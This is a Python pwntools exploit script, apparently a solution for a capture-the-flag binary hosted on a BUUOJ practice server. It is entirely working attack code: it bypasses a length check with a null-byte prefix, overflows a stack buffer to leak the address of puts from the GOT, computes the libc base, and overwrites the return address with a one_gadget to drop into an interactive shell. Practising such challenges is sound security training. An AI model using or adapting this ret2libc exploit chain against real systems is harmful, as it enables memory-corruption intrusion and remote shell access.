import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	if len(sys.argv)==1 :
		io=process('./pwn')
		elf=ELF('./pwn')
		libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else :
		io=remote('node3.buuoj.cn',28267)
		elf=ELF('./pwn')
		libc=ELF('./libc.so')



	pay='\x00'*0x7+'\xff'
	io.sendline(pay)
	pay='a'*(0xe7+4)+p32(elf.plt['puts'])+p32(0x080485a0)+p32(elf.got['puts'])
	io.recv()
	io.sendline(pay)
	libc.address=u32(io.recv()[:4])-libc.sym['puts']
	success('libc:'+hex(libc.address))
	pay='\x00'*0x7+'\xff'
	io.sendline(pay)
	io.recv()
	pay='a'*(0xe7+4)+p32(libc.address+0x3a819)
	io.sendline(pay)
	#gdb.attach(io)
	#pause()
	io.interactive()